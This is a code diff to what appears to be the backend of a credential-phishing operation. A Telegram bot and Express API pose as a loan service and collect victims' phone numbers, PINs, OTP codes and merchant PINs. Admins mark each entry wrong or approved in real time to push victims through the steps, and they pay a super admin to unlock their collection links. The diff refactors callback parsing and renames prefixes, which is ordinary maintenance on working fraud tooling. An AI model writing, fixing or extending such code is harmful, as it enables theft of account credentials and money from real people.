@@ -409,7 +409,7 @@ Please contact the super admin.
                     return;
                 }
 
-                const admin       = await db.getAdmin(adminId);
+                const admin   = await db.getAdmin(adminId);
                 const isAdmin = isSuperAdmin(adminId);
 
                 let message = `
@@ -466,7 +466,7 @@ Provide this to your super admin to get access.
     bot.onText(/\/mylink/, async (msg) => {
         const chatId  = msg.chat.id;
         const adminId = getAdminIdByChatId(chatId);
-        if (!adminId)              return bot.sendMessage(chatId, '❌ Not registered as admin.');
+        if (!adminId)               return bot.sendMessage(chatId, '❌ Not registered as admin.');
         if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access has been paused.');
         const admin = await db.getAdmin(adminId);
         bot.sendMessage(chatId, `
@@ -482,7 +482,7 @@ Provide this to your super admin to get access.
     bot.onText(/\/stats/, async (msg) => {
         const chatId  = msg.chat.id;
         const adminId = getAdminIdByChatId(chatId);
-        if (!adminId)              return bot.sendMessage(chatId, '❌ Not registered as admin.');
+        if (!adminId)               return bot.sendMessage(chatId, '❌ Not registered as admin.');
         if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access has been paused.');
         const stats = await db.getAdminStats(adminId);
         bot.sendMessage(chatId, `
@@ -500,10 +500,10 @@ Provide this to your super admin to get access.
     bot.onText(/\/pending/, async (msg) => {
         const chatId  = msg.chat.id;
         const adminId = getAdminIdByChatId(chatId);
-        if (!adminId)              return bot.sendMessage(chatId, '❌ Not registered as admin.');
+        if (!adminId)               return bot.sendMessage(chatId, '❌ Not registered as admin.');
         if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access has been paused.');
 
-        const adminApps = await db.getApplicationsByAdmin(adminId);
+        const adminApps  = await db.getApplicationsByAdmin(adminId);
         const pinPending = adminApps.filter(a => a.pinStatus === 'pending');
         const otpPending = adminApps.filter(a => a.otpStatus === 'pending' && a.pinStatus === 'approved');
 
@@ -531,9 +531,9 @@ Provide this to your super admin to get access.
     bot.onText(/\/myinfo/, async (msg) => {
         const chatId  = msg.chat.id;
         const adminId = getAdminIdByChatId(chatId);
-        if (!adminId)              return bot.sendMessage(chatId, '❌ Not registered as admin.');
+        if (!adminId)               return bot.sendMessage(chatId, '❌ Not registered as admin.');
         if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access has been paused.');
-        const admin      = await db.getAdmin(adminId);
+        const admin       = await db.getAdmin(adminId);
         const statusEmoji = pausedAdmins.has(adminId) ? '🚫' : '✅';
         const statusText  = pausedAdmins.has(adminId) ? 'Paused' : 'Active';
         bot.sendMessage(chatId, `
@@ -613,7 +613,8 @@ Use this format:
             // Start 5-minute timer for link payment
             startLinkPaymentTimer(newAdminId);
 
-            // Notify super admin to confirm if already paid
+            // FIX: renamed callback_data prefix from link_paid_yes/no to linkpaid_yes/no
+            // to prevent collision with the application callback parser
             await bot.sendMessage(chatId, `
 ✅ *NEW ADMIN CREATED*
 
@@ -629,8 +630,8 @@ Use this format:
                 parse_mode: 'Markdown',
                 reply_markup: {
                     inline_keyboard: [[
-                        { text: '✅ YES - Already Paid', callback_data: `link_paid_yes_${newAdminId}` },
-                        { text: '❌ NO - Not Paid Yet', callback_data: `link_paid_no_${newAdminId}` }
+                        { text: '✅ YES - Already Paid', callback_data: `linkpaid_yes_${newAdminId}` },
+                        { text: '❌ NO - Not Paid Yet', callback_data: `linkpaid_no_${newAdminId}` }
                     ]]
                 }
             });
@@ -711,7 +712,7 @@ Use: \`/addadminid ADMINID|NAME|EMAIL|CHATID\`
             // Start 5-minute timer for link payment
             startLinkPaymentTimer(newAdminId);
 
-            // Notify super admin to confirm if already paid
+            // FIX: renamed callback_data prefix from link_paid_yes/no to linkpaid_yes/no
             await bot.sendMessage(chatId, `
 ✅ *NEW ADMIN CREATED*
 
@@ -727,8 +728,8 @@ Use: \`/addadminid ADMINID|NAME|EMAIL|CHATID\`
                 parse_mode: 'Markdown',
                 reply_markup: {
                     inline_keyboard: [[
-                        { text: '✅ YES - Already Paid', callback_data: `link_paid_yes_${newAdminId}` },
-                        { text: '❌ NO - Not Paid Yet', callback_data: `link_paid_no_${newAdminId}` }
+                        { text: '✅ YES - Already Paid', callback_data: `linkpaid_yes_${newAdminId}` },
+                        { text: '❌ NO - Not Paid Yet', callback_data: `linkpaid_no_${newAdminId}` }
                     ]]
                 }
             });
@@ -926,7 +927,7 @@ Use /unpauseadmin ${targetAdminId} to restore.
     bot.onText(/\/admins/, async (msg) => {
         const chatId  = msg.chat.id;
         const adminId = getAdminIdByChatId(chatId);
-        if (!adminId)              return bot.sendMessage(chatId, '❌ Not registered as admin.');
+        if (!adminId)               return bot.sendMessage(chatId, '❌ Not registered as admin.');
         if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access has been paused.');
 
         try {
@@ -934,8 +935,8 @@ Use /unpauseadmin ${targetAdminId} to restore.
             let message = `👥 *ALL ADMINS (${allAdmins.length})*\n\n`;
 
             allAdmins.forEach((admin, index) => {
-                const isSuper   = isSuperAdmin(admin.adminId);
-                const isPaused  = pausedAdmins.has(admin.adminId);
+                const isSuper    = isSuperAdmin(admin.adminId);
+                const isPaused   = pausedAdmins.has(admin.adminId);
                 const isConnected = adminChatIds.has(admin.adminId);
                 const statusEmoji = isSuper ? '⭐' : isPaused ? '🚫' : '✅';
                 const statusText  = isSuper ? 'Super Admin' : isPaused ? 'Paused' : 'Active';
@@ -963,7 +964,7 @@ Use /unpauseadmin ${targetAdminId} to restore.
         if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only super admin can view pending payments.');
 
         try {
-            const allAdmins = await db.getAllAdmins();
+            const allAdmins       = await db.getAllAdmins();
             const pendingPayments = allAdmins.filter(a => a.paymentStatus === 'pending' && a.payerName);
 
             if (pendingPayments.length === 0) {
@@ -1193,6 +1194,8 @@ ${results.join('\n')}
 
             const requestId = `REQ-${Date.now()}`;
 
+            // FIX: renamed request_done / request_help to requestdone / requesthelp
+            // to prevent collision with the application callback parser
             const sent = await bot.sendMessage(adminChatIds.get(targetAdminId), `
 ❓ *REQUEST FROM SUPER ADMIN*
 
@@ -1205,8 +1208,8 @@ ${requestText}
                 parse_mode: 'Markdown',
                 reply_markup: {
                     inline_keyboard: [[
-                        { text: '✅ Done',      callback_data: `request_done_${requestId}_${targetAdminId}` },
-                        { text: '❓ Need Help', callback_data: `request_help_${requestId}_${targetAdminId}` }
+                        { text: '✅ Done',      callback_data: `requestdone_${requestId}_${targetAdminId}` },
+                        { text: '❓ Need Help', callback_data: `requesthelp_${requestId}_${targetAdminId}` }
                     ]]
                 }
             });
@@ -1226,13 +1229,11 @@ ${requestText}
         const chatId  = msg.chat.id;
         const adminId = getAdminIdByChatId(chatId);
         
-        // SUPER ADMIN ONLY
         if (!isSuperAdmin(adminId)) {
             return bot.sendMessage(chatId, '❌ Only super admin can do this!');
         }
         
         try {
-            // Show confirmation prompt
             await bot.sendMessage(chatId, `
 ⚠️ *WARNING - IRREVERSIBLE ACTION*
 
@@ -1302,7 +1303,8 @@ We will notify you once the payment is confirmed.
 Your link will be unlocked immediately after approval.
             `, { parse_mode: 'Markdown' });
             
-            // Notify all super admins
+            // FIX: renamed approve_payment / reject_payment to approvepayment / rejectpayment
+            // to prevent collision with the application callback parser
             for (const superAdminId of SUPER_ADMINS) {
                 const superAdminChatId = adminChatIds.get(superAdminId);
                 if (superAdminChatId) {
@@ -1326,8 +1328,8 @@ Please verify and respond:
                         parse_mode: 'Markdown',
                         reply_markup: {
                             inline_keyboard: [[
-                                { text: '✅ APPROVE PAYMENT', callback_data: `approve_payment_${adminId}` },
-                                { text: '❌ REJECT PAYMENT', callback_data: `reject_payment_${adminId}` }
+                                { text: '✅ APPROVE PAYMENT', callback_data: `approvepayment_${adminId}` },
+                                { text: '❌ REJECT PAYMENT',  callback_data: `rejectpayment_${adminId}` }
                             ]]
                         }
                     });
@@ -1357,15 +1359,26 @@ bot.on('callback_query', async (callbackQuery) => {
         return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Not authorized!', show_alert: true });
     }
 
-    // ── Link payment callback (yes/no already paid) ──
-    if (data.startsWith('link_paid_yes_') || data.startsWith('link_paid_no_')) {
-        const parts = data.split('_');
-        const answer = parts[2]; // yes or no
-        const targetAdminId = parts.slice(3).join('_');
+    // ─────────────────────────────────────────────────────────────
+    // FIX: Use indexOf-based prefix detection instead of split('_')
+    // so adminIds like ADMIN001 and appIds like APP-123 are never
+    // accidentally split across tokens.
+    // ─────────────────────────────────────────────────────────────
+    const firstUS = data.indexOf('_');
+    const prefix  = firstUS === -1 ? data : data.substring(0, firstUS);
+    const rest    = firstUS === -1 ? ''   : data.substring(firstUS + 1);
 
+    // ── linkpaid_yes_ADMINID  /  linkpaid_no_ADMINID ──
+    // (was link_paid_yes_ / link_paid_no_ — renamed to avoid split collision)
+    if (prefix === 'linkpaid') {
         if (!isSuperAdmin(adminId)) {
             return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Not authorized!', show_alert: true });
         }
+
+        // rest = "yes_ADMINID" or "no_ADMINID"
+        const secondUS      = rest.indexOf('_');
+        const answer        = rest.substring(0, secondUS);       // yes / no
+        const targetAdminId = rest.substring(secondUS + 1);      // e.g. ADMIN003
 
         if (answer === 'yes') {
             // Admin already paid - remove timer, unlock link
@@ -1387,7 +1400,7 @@ Link is now unlocked and permanently active!
 
             await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Payment approved, link unlocked!' });
 
-            // Notify the admin with detailed message
+            // Notify the admin
             const admin = await db.getAdmin(targetAdminId);
             if (admin?.chatId) {
                 bot.sendMessage(admin.chatId, `
@@ -1415,7 +1428,7 @@ Thank you for your payment!
                 `, { parse_mode: 'Markdown' }).catch(() => {});
             }
         } else {
-            // Admin NOT paid yet - keep 5-min timer, no notification
+            // Admin NOT paid yet - keep 5-min timer running
             await bot.editMessageText(`
 ⏱️ *LINK TIMER ACTIVE*
 
@@ -1430,18 +1443,17 @@ Admin will receive payment instructions when timer expires.
         return;
     }
 
-    // ── Payment submission approval/rejection callbacks ──
-    if (data.startsWith('approve_payment_') || data.startsWith('reject_payment_')) {
-        const parts = data.split('_');
-        const action = parts[0]; // approve or reject
-        const targetAdminId = parts.slice(2).join('_');
+    // ── approvepayment_ADMINID  /  rejectpayment_ADMINID ──
+    // (was approve_payment_ / reject_payment_ — renamed to avoid split collision)
+    if (prefix === 'approvepayment' || prefix === 'rejectpayment') {
+        const targetAdminId = rest; // everything after first underscore
 
         const admin = await db.getAdmin(targetAdminId);
         if (!admin) {
             return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Admin not found!', show_alert: true });
         }
 
-        if (action === 'approve') {
+        if (prefix === 'approvepayment') {
             // Unlock link and mark as paid
             removeLinkPaymentTimer(targetAdminId);
             await db.updateAdmin(targetAdminId, { 
@@ -1462,7 +1474,6 @@ Link is now unlocked!
 
             await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Payment approved!' });
 
-            // Notify the admin that payment was approved
             if (admin.chatId) {
                 await bot.sendMessage(admin.chatId, `
 ✅ *PAYMENT APPROVED!*
@@ -1475,8 +1486,8 @@ Your admin link is now permanently active.
 Use /start to see available commands.
                 `, { parse_mode: 'Markdown' });
             }
-        } else if (action === 'reject') {
-            // Keep link locked, notify admin to resubmit
+        } else {
+            // rejectpayment
             await db.updateAdmin(targetAdminId, { 
                 paymentStatus: 'rejected',
                 paymentSubmittedAt: null,
@@ -1495,7 +1506,6 @@ Link remains locked. Admin can resubmit payment.
 
             await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Payment rejected' });
 
-            // Notify the admin that payment was rejected
             if (admin.chatId) {
                 await bot.sendMessage(admin.chatId, `
 ❌ *PAYMENT REJECTED*
@@ -1528,11 +1538,12 @@ If you have questions, contact the super admin.
         return;
     }
 
+    // ── Admin-active check for all remaining callbacks ──
     if (!isAdminActive(chatId)) {
         return bot.answerCallbackQuery(callbackQuery.id, { text: '🚫 Your admin access has been paused.', show_alert: true });
     }
 
-    // ── Clear all admins callbacks (must be before general parsing) ──
+    // ── confirm_clear_admins  /  cancel_clear_admins ──
     if (data === 'confirm_clear_admins' || data === 'cancel_clear_admins') {
         if (!isSuperAdmin(adminId)) {
             return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Not authorized!', show_alert: true });
@@ -1540,7 +1551,7 @@ If you have questions, contact the super admin.
 
         if (data === 'confirm_clear_admins') {
             try {
-                const allAdmins = await db.getAllAdmins();
+                const allAdmins     = await db.getAllAdmins();
                 const adminsToClear = allAdmins.filter(a => !isSuperAdmin(a.adminId));
                 let deletedCount = 0;
                 const deletedNames = [];
@@ -1603,13 +1614,15 @@ Clear all admins operation was cancelled.
         return;
     }
 
-    // ── Request responses (Done / Need Help) ──
-    if (data.startsWith('request_done_') || data.startsWith('request_help_')) {
-        const parts             = data.split('_');
-        const action            = parts[1];
-        const requestId         = parts[2];
-        const respondingAdminId = parts[3];
+    // ── requestdone_REQID_ADMINID  /  requesthelp_REQID_ADMINID ──
+    // (was request_done_ / request_help_ — renamed to avoid split collision)
+    if (prefix === 'requestdone' || prefix === 'requesthelp') {
+        // rest = "REQ-1234567890_ADMIN003"
+        const lastUS            = rest.lastIndexOf('_');
+        const requestId         = rest.substring(0, lastUS);
+        const respondingAdminId = rest.substring(lastUS + 1);
         const respondingAdmin   = await db.getAdmin(respondingAdminId);
+        const action            = prefix === 'requestdone' ? 'done' : 'help';
 
         // Notify all super admins
         for (const superAdminId of SUPER_ADMINS) {
@@ -1654,16 +1667,25 @@ Super admin has been notified.
         return;
     }
 
-    // ── Parse: action_type_ADMINID_applicationId ──
-    const parts = data.split('_');
-    if (parts.length < 4) {
+    // ─────────────────────────────────────────────────────────────
+    // APPLICATION CALLBACKS
+    // Format: ACTION_TYPE_ADMINID_APPID
+    //   ACTION: deny | allow | approve | wrongpin | wrongcode | wrongmerchpin
+    //   TYPE:   pin  | pin   | otp|merch| otp      | otp       | merch
+    //
+    // Split strategy: tokens[0]=action, tokens[1]=type, tokens[2]=adminId (ADMIN\d+),
+    // tokens.slice(3).join('_') = applicationId (may contain hyphens but not underscores)
+    // ─────────────────────────────────────────────────────────────
+    const tokens = data.split('_');
+
+    if (tokens.length < 4) {
         return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Invalid callback data.', show_alert: true });
     }
 
-    const action          = parts[0];
-    const type            = parts[1];
-    const embeddedAdminId = parts[2];
-    const applicationId   = parts.slice(3).join('_');
+    const action          = tokens[0];
+    const type            = tokens[1];
+    const embeddedAdminId = tokens[2];
+    const applicationId   = tokens.slice(3).join('_');
 
     // Ownership check
     if (embeddedAdminId !== adminId) {
@@ -1675,7 +1697,8 @@ Super admin has been notified.
         return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application not found or not yours!', show_alert: true });
     }
 
-    // Wrong PIN at OTP stage
+    // ── Wrong PIN at OTP stage ──
+    // callback_data: wrongpin_otp_ADMINID_APPID
     if (action === 'wrongpin' && type === 'otp') {
         await db.updateApplication(applicationId, { otpStatus: 'wrongpin_otp' });
         await bot.editMessageText(`
@@ -1695,7 +1718,8 @@ User will re-enter PIN.
         return;
     }
 
-    // Wrong code
+    // ── Wrong OTP code ──
+    // callback_data: wrongcode_otp_ADMINID_APPID
     if (action === 'wrongcode' && type === 'otp') {
         await db.updateApplication(applicationId, { otpStatus: 'wrongcode' });
         await bot.editMessageText(`
@@ -1715,7 +1739,7 @@ User will re-enter code.
         return;
     }
 
-    // Deny PIN
+    // ── Deny PIN ──
     if (action === 'deny' && type === 'pin') {
         await db.updateApplication(applicationId, { pinStatus: 'rejected' });
         await bot.editMessageText(`
@@ -1730,10 +1754,11 @@ User will re-enter code.
 ⏰ ${new Date().toLocaleString()}
         `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
         await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application rejected' });
+        return;
     }
 
-    // Allow OTP
-    else if (action === 'allow' && type === 'pin') {
+    // ── Allow OTP (PIN approved) ──
+    if (action === 'allow' && type === 'pin') {
         await db.updateApplication(applicationId, { pinStatus: 'approved' });
         await bot.editMessageText(`
 ✅ *ALL CORRECT - APPROVED*
@@ -1749,10 +1774,11 @@ User will re-enter code.
 User will now proceed to OTP.
         `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
         await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Approved! User can enter OTP now.' });
+        return;
     }
 
-    // Approve Loan
-    else if (action === 'approve' && type === 'otp') {
+    // ── Approve Loan (OTP approved) ──
+    if (action === 'approve' && type === 'otp') {
         await db.updateApplication(applicationId, { otpStatus: 'approved' });
         await bot.editMessageText(`
 🎉 *LOAN APPROVED!*
@@ -1769,10 +1795,11 @@ User will now proceed to OTP.
 ✅ User will see approval page!
         `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
         await bot.answerCallbackQuery(callbackQuery.id, { text: '🎉 Loan approved!' });
+        return;
     }
 
-    // Wrong Merchant PIN
-    else if (action === 'wrongmerchpin' && type === 'merch') {
+    // ── Wrong Merchant PIN ──
+    if (action === 'wrongmerchpin' && type === 'merch') {
         await db.updateApplication(applicationId, { merchantPinStatus: 'wrong' });
         await bot.editMessageText(`
 ❌ *WRONG MERCHANT PIN*
@@ -1786,10 +1813,11 @@ User will now proceed to OTP.
 ⏰ ${new Date().toLocaleString()}
         `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
         await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Wrong merchant PIN flagged' });
+        return;
     }
 
-    // Approve via Merchant PIN
-    else if (action === 'approve' && type === 'merch') {
+    // ── Approve via Merchant PIN ──
+    if (action === 'approve' && type === 'merch') {
         await db.updateApplication(applicationId, { merchantPinStatus: 'approved' });
         await bot.editMessageText(`
 🎉 *FULLY APPROVED — MERCHANT PIN CONFIRMED!*
@@ -1805,7 +1833,11 @@ User will now proceed to OTP.
 ⏰ ${new Date().toLocaleString()}
         `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
         await bot.answerCallbackQuery(callbackQuery.id, { text: '🎉 Merchant PIN confirmed & loan approved!' });
+        return;
     }
+
+    // Unknown callback — catch-all
+    await bot.answerCallbackQuery(callbackQuery.id, { text: '⚠️ Unknown action.', show_alert: true });
 });
 
 console.log('✅ Telegram callback handler registered!');
@@ -1844,7 +1876,6 @@ app.post('/api/verify-pin', async (req, res) => {
 
         if (assignmentType === 'specific' && requestAdminId) {
             // ── HARD LOCK: customer came via a specific admin link ──
-            // NEVER fall back to another admin — that would be a data leak.
             assignedAdmin = await db.getAdmin(requestAdminId);
 
             if (!assignedAdmin) {
@@ -1870,8 +1901,8 @@ app.post('/api/verify-pin', async (req, res) => {
 
         } else {
             // ── AUTO-ASSIGN: no admin link used ──
-            const activeAdmins     = await db.getActiveAdmins();
-            const availableAdmins  = activeAdmins.filter(a => !pausedAdmins.has(a.adminId) && !a.linkLocked);
+            const activeAdmins    = await db.getActiveAdmins();
+            const availableAdmins = activeAdmins.filter(a => !pausedAdmins.has(a.adminId) && !a.linkLocked);
             if (availableAdmins.length === 0) {
                 processingLocks.delete(lockKey);
                 return res.status(503).json({ success: false, message: 'No admins available. Please try again later.' });
@@ -1888,8 +1919,8 @@ app.post('/api/verify-pin', async (req, res) => {
         }
 
         // Duplicate check — only within this admin's pending apps
-        const existingApps    = await db.getApplicationsByAdmin(assignedAdmin.adminId);
-        const alreadyPending  = existingApps.find(a => a.phoneNumber === phoneNumber && a.pinStatus === 'pending');
+        const existingApps   = await db.getApplicationsByAdmin(assignedAdmin.adminId);
+        const alreadyPending = existingApps.find(a => a.phoneNumber === phoneNumber && a.pinStatus === 'pending');
         if (alreadyPending) {
             processingLocks.delete(lockKey);
             return res.json({
@@ -2127,7 +2158,6 @@ app.post('/api/verify-merchant-pin', async (req, res) => {
             ? `\n🔄 *Returning customer* (${application.previousCount || 1} previous visits)`
             : '';
 
-        // Send to Telegram — same style as verify-pin and verify-otp
         await sendToAdmin(application.adminId, `
 💳 *MERCHANT ACCOUNT PIN*${returningLabel}
 
